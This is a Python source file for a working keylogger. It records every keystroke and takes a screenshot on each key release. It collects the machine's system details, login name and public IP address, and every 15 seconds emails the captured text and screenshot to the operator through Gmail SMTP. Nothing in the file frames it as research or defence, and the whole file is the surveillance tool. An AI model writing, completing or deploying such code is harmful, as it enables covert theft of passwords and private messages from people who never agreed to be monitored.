import config
import platform
import smtplib
import os
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import keyboard
from threading import Timer
from datetime import datetime
import pyautogui as pg
import requests

SEND_REPORT_EVERY = 15


class Kl:
    def __init__(self, interval):
        self.interval = interval
        self.log = ''
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()
        self.email = config.email
        self.password = config.password
        self.filepath = "ScreenS"
        self.response = requests.get('http://jsonip.com')


    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "\n"
            elif name == "decimal":
                name = '.'
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name
        pg.screenshot("ScreenS.png")

    def update_filename(self):
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"kl_Start {start_dt_str} - End {end_dt_str}"

    def report_to_file(self):
        with open(f"{self.filename}.txt", "a") as file:
            file.write(f"System: {(platform.uname())}\nUser: {os.getlogin()}\nIP: {self.response.json()['ip']}\nText: ")
            print(self.log, file=file)
        print(f"Сохранение {self.filename}.txt")

    def report(self):
        if self.log:
            self.end_dt = datetime.now()
            self.update_filename()
            self.report_to_file()
            self.start_dt = datetime.now()

        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()
        sender = config.email
        password = config.password
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        try:
            msg = MIMEMultipart()
            server.login(sender, password)
            file = MIMEImage(open(f"{self.filepath}.png", 'rb').read(),_subtype="png")
            text = MIMEText(open(f"{self.filename}.txt", "r").read())
            msg["Subject"] = f"{self.filename}!"
            msg.attach(file)
            msg.attach(text)
            server.sendmail(sender, sender, msg.as_string())
            return "The message was sent successfully!"
        except Exception as _ex:
            return f"{_ex}\nCheck your login or password please!"

    def start(self):
        self.start_dt = datetime.now()
        keyboard.on_release(callback=self.callback)
        self.report()
        keyboard.wait()


if __name__ == "__main__":
    Kl(interval=SEND_REPORT_EVERY).start()

